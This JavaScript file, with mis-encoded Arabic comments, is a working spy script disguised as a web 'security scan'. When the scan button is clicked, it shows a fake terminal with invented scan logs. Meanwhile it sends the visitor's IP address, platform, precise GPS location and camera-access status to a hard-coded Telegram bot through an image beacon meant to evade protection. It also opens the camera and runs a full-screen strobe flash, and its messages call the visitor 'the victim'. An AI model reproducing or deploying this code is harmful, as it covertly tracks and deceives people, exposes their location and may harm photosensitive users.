(function() {
    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
    const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
    const _id = "7253092491";

    // Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø°ÙƒÙŠØ© - Ø¨ØªØ³ØªØ®Ø¯Ù… Ø§Ù„Ù€ Image Beacon Ø¹Ø´Ø§Ù† ØªÙ‡Ø±Ø¨ Ù…Ù† Ø§Ù„Ø­Ù…Ø§ÙŠØ©
    function _send(msg) {
        const url = `https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[SYSTEM_LOG]: " + msg)}`;
        const img = new Image();
        img.src = url; 
    }

    // 1. Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (GPS)
    function _location() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((p) => {
                const mapLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                _send(`Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…ØªØ§Ø­: ${mapLink}`);
            }, () => { _send("Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹"); }, {enableHighAccuracy: true});
        }
    }

    // 2. Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP ÙˆØ¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
    async function _getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            _send(`IP Ø§Ù„Ø®Ø§Øµ Ø¨Ù‡: ${data.ip}\nØ§Ù„Ù†Ø¸Ø§Ù…: ${navigator.platform}`);
        } catch (e) { _send("ÙØ´Ù„ Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP"); }
    }

    // 3. Ø³Ø­Ø¨ Ø§Ù„ØµÙˆØ±Ø© ÙˆØªÙØ¹ÙŠÙ„ Ø§Ù„ÙÙ„Ø§Ø´
    async function _capture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true});
            _send("ØªÙ… Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ù†Ø¬Ø§Ø­!");
            
            // ØªØ£Ø«ÙŠØ± Ø§Ù„ÙÙ„Ø§Ø´ Ø§Ù„Ù…Ø±Ø¹Ø¨
            _strobe();
            
            // Ù…Ù„Ø§Ø­Ø¸Ø©: Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙƒÙ…Ù„Ù Ø¨ÙŠØ­ØªØ§Ø¬ Ø¯Ø§Ù„Ø© Ø£Ø¹Ù‚Ø¯ØŒ Ù‡Ù†Ø¨Ø¯Ø£ Ø¨Ø§Ù„ØªØ£ÙƒØ¯ Ø¥Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†ØµÙŠØ© ÙˆØµÙ„Øª
            setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch (e) { _send("Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§"); }
    }

    function _strobe() {
        const d = document.createElement('div');
        d.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:white;";
        document.body.appendChild(d);
        let i = 0;
        const itv = setInterval(() => {
            d.style.display = (i++ % 2 == 0) ? 'none' : 'block';
            if(i > 25) { clearInterval(itv); document.body.removeChild(d); }
        }, 50);
    }

    // ØªÙØ¹ÙŠÙ„ ÙƒÙ„ Ø´ÙŠØ¡ Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø±Ø§Ø±
    const startBtn = document.getElementById('startScanBtn');
    if(startBtn) {
        startBtn.addEventListener('click', () => {
            _send("Ø¨Ø¯Ø£ Ø§Ù„Ø¶Ø­ÙŠØ© Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¢Ù† ðŸš€");
            _getIP();
            _location();
            _capture();

            // Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ÙˆÙ‡Ù…ÙŠØ©
            const term = document.getElementById('terminal');
            if(term) {
                term.style.display = 'block';
                const logs = ["Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±...", "ÙØ­Øµ Ø³Ù„Ø§Ù…Ø© Ø§Ù„Ø±ÙˆØ§Ø¨Ø·...", "ØªØ­Ù„ÙŠÙ„ Ø§Ù„ØªÙ‡Ø¯ÙŠØ¯Ø§Øª Ø§Ù„Ù…Ø­ØªÙ…Ù„Ø©...", "ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ø«ØºØ±Ø©! Ø¬Ø§Ø±ÙŠ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙ‚Ø±ÙŠØ±..."];
                let i = 0;
                const l = setInterval(() => {
                    const p = document.createElement('div');
                    p.className = "line";
                    p.innerText = "> " + logs[i++];
                    document.getElementById('logs').appendChild(p);
                    if(i >= logs.length) clearInterval(l);
                }, 1000);
            }
        });
    }
})();

